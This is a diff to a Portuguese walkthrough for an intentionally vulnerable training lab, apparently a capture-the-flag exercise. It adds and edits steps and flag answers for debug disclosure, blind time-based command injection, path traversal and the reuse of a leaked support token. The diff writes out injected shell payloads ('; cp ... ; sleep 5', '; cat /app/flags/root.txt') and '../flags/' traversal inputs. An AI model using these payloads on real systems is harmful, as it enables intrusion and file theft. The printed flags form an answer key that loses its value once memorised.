@@ -98,6 +98,18 @@ A tentativa correta retorna `200` e a mensagem:
 Login successful
 ```
 
+Antes de seguir para o painel, volte a nota de deployment. Ela menciona a revisao de acesso arquivada em:
+
+```text
+/old/access-review.txt
+```
+
+Esse arquivo fecha a superficie pre-auth com:
+
+```text
+FLAG{pre_auth_debug_disclosure_lab3}
+```
+
 Use a credencial encontrada para entrar:
 
 ```text
@@ -193,6 +205,24 @@ Observe `durationMs`. Depois altere apenas o alvo:
 
 Compare o tempo de resposta e o `durationMs`. Um atraso de aproximadamente 5 segundos confirma execucao por canal de tempo, mesmo sem stdout/stderr. Essa etapa confirma blind command injection; ela nao captura flag automaticamente.
 
+Para transformar essa execucao cega em um efeito observavel seguro, copie a flag time-based para um arquivo publico e mantenha o atraso:
+
+```text
+127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #
+```
+
+O modo TCP continua sem devolver stdout/stderr. A confirmacao aparece fora da resposta original, acessando:
+
+```text
+http://127.0.0.1:8090/reports/tcp-proof.txt
+```
+
+Resultado esperado:
+
+```text
+FLAG{blind_time_based_command_injection_lab3}
+```
+
 ## 6. Inspecao do JavaScript
 
 Abra DevTools Sources ou acesse `/js/app.js` no navegador. Procure referencias discretas, nao links de menu.
@@ -258,7 +288,7 @@ Leia o arquivo como log operacional e procure:
 - endpoint interno;
 - header esperado;
 - token dividido em partes;
-- rota de backup;
+- rotas internas de diagnostics e backup;
 - evidencia fora do diretorio de dados.
 
 ## 9. Path Traversal
@@ -268,19 +298,22 @@ O campo `Log file` chama `/api/support/log?file=app.log`, o que sugere que o bac
 Ao usar:
 
 ```text
-../flags/flag3.txt
-```
-
-o caminho efetivo fica como `/app/data/../flags/flag3.txt`, que resolve para `/app/flags/flag3.txt`.
-
-Use traversal para ler duas evidencias diferentes:
-
-```text
-../flags/flag3.txt
 ../flags/flag4.txt
 ```
 
-A causa raiz e aceitar entrada do usuario em `path.join` sem garantir que o caminho final permaneceu dentro do diretorio permitido. `flag3` e `flag4` sao duas evidencias diferentes obtidas pela mesma falha de path traversal.
+o caminho efetivo fica como `/app/data/../flags/flag4.txt`, que resolve para `/app/flags/flag4.txt`.
+
+Use traversal para ler:
+
+```text
+../flags/flag4.txt
+```
+
+A causa raiz e aceitar entrada do usuario em `path.join` sem garantir que o caminho final permaneceu dentro do diretorio permitido. Essa superficie agora possui uma unica flag principal:
+
+```text
+FLAG{path_traversal_log_viewer_lab3}
+```
 
 ## 10. Token interno e Broken Access Control
 
@@ -304,7 +337,25 @@ No Burp Repeater, chame `/api/internal/health` enviando:
 X-Support-Token: netaudit-debug-2026
 ```
 
-Sem token, a resposta deve ser `403`. Com token, o healthcheck retorna metadados. Ele nao retorna flag diretamente, mas revela o endpoint de backup e o arquivo diagnostico.
+Sem token, a resposta deve ser `403`. Com token, o healthcheck retorna metadados. Ele nao retorna flag diretamente, mas revela:
+
+```text
+diagnosticEndpoint: /api/internal/diagnostics
+backupEndpoint: /api/internal/backup
+```
+
+Chame o endpoint de diagnostics com o mesmo header:
+
+```text
+GET /api/internal/diagnostics
+X-Support-Token: netaudit-debug-2026
+```
+
+Ele retorna a flag dessa superficie interna:
+
+```text
+FLAG{internal_diagnostics_token_abuse_lab3}
+```
 
 ## 11. Backup command injection
 
@@ -330,20 +381,13 @@ Depois explore `archiveName`:
 
 ```json
 {
-  "archiveName": "backup.tar.gz; cat /app/flags/flag5.txt"
-}
-```
-
-```json
-{
   "archiveName": "backup.tar.gz; cat /app/flags/root.txt"
 }
 ```
 
-Esses bodies leem:
+Esse body le:
 
 ```text
-/app/flags/flag5.txt
 /app/flags/root.txt
 ```
 
